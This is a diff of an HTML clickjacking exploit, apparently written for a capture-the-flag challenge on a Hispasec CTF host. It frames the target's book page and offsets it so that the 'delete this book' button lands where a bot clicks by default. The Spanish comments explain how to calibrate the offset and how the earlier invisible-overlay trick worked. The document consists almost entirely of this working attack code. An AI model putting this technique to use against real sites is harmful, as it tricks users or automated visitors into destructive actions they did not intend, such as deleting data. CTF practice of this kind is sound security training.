@@ -2,50 +2,42 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Exploit Final</title>
+    <title>Clickjacking</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: white; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }
 
-        /* El botón que el bot busca. 
-           Estará ARRIBA del iframe, pero el click pasará a través de él. */
+        /* Contenedor para posicionar el iframe exactamente donde está el botón de borrar */
+        .crop {
+            position: absolute;
+            /* Estos valores son críticos. Si el bot no clica, ajusta el TOP */
+            top: 0px; 
+            left: 0px;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        /* El iframe ES el botón objetivo para el bot */
         #objetivo {
             position: absolute;
-            top: 0;
-            left: 0;
             width: 100%;
-            height: 100%;
-            z-index: 100; /* Capa superior absoluta */
-            opacity: 0.01; /* Casi invisible pero 'existente' para el bot */
-            cursor: pointer;
-            /* El truco: el bot clica aquí, pero el evento pasa al fondo */
-            pointer-events: none; 
-        }
-
-        /* Contenedor del Iframe */
-        .victim-container {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1; /* Debajo del botón */
-        }
-
-        iframe {
-            width: 100%;
-            height: 1500px;
+            height: 2000px; /* Página completa */
             border: none;
-            /* Calibramos para que el botón 'Borrar' de la web real esté arriba */
-            margin-top: 500px; 
+            /* AJUSTE DE POSICIÓN: 
+               Subimos la página para que el botón "Borrar este libro" 
+               quede justo en la esquina superior izquierda, que es donde los bots suelen clicar por defecto si no especificas coordenadas */
+            margin-top: -750px; 
+            margin-left: -20px;
+            /* Casi invisible pero 'existente' */
+            opacity: 1; 
+            z-index: 100;
         }
     </style>
 </head>
 <body>
 
-    <button id="objetivo">CLICK AQUI</button>
-
-    <div class="victim-container">
-        <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
+    <div class="crop">
+        <iframe id="objetivo" src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
     </div>
 
 </body>
